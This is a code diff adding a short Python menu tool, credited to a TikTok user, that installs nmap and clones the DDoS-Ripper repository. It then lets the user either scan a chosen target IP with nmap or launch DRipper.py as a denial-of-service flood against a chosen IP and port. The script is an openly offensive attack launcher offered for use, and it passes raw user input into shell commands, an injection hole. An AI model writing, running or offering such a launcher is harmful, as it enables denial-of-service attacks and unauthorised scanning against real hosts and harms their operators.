@@ -1,0 +1,42 @@
+import os
+import time
+while True:
+    os.system("sudo apt update && sudo apt install -y nmap")
+    os.system("sudo apt update && sudo apt install -y git")
+    os.system("sudo apt update && sudo apt install -y wget")
+    os.system("sudo apt update && sudo apt install -y python")
+    os.system("sudo apt update && sudo apt install -y python3")
+    os.system("sudo git clone https://github.com/palahsu/DDoS-Ripper.git")
+    full_path = "/storage/DDoS-Ripper"
+    os.chdir(full_path)
+    os.system("clear")
+    print("███████╗██████╗░███████╗░█████╗░██╗░░██╗")
+    print("██╔════╝██╔══██╗██╔════╝██╔══██╗██║░██╔╝")
+    print("█████╗░░██████╔╝█████╗░░███████║█████═╝░")
+    print("██╔══╝░░██╔══██╗██╔══╝░░██╔══██║██╔═██╗░")
+    print("██║░░░░░██║░░██║███████╗██║░░██║██║░╚██╗")
+    print("╚═╝░░░░░╚═╝░░╚═╝╚══════╝╚═╝░░╚═╝╚═╝░░╚═╝")
+    print("                      TOOL MADE BY apexvr_ ON TIKTOK")
+    print("")
+    print("1. Nmap Scan")
+    print("2. DDoS (DDoS Ripper)")
+    print("3. Update")
+    freakchoice = int(input(">>> "))
+    if freakchoice == 3:
+        os.system("sudo apt update && sudo apt install -y nmap")
+        os.system("sudo apt update && sudo apt install -y git")
+        os.system("sudo apt update && sudo apt install -y wget")
+        os.system("sudo apt update && sudo apt install -y python")
+        os.system("sudo apt update && sudo apt install -y python3")
+        os.system("sudo git clone https://github.com/palahsu/DDoS-Ripper.git")
+    elif freakchoice == 1:
+        IP = input("TARGET IP: ")
+        METHOD = input("SCAN METHOD (sT, sS, Pn...): ")
+        os.system(f"sudo nmap -{METHOD} {IP}")
+        time.sleep(5)
+    elif freakchoice == 2:
+        IPDDOS = input("TARGET IP: ")
+        PORTDDOS = int(input("OPEN PORT: "))
+        print("Press CTRL + C to break")
+        time.sleep(2)
+        os.system(f"python3 DRipper.py -s {IPDDOS} -p {PORTDDOS} -t 443")
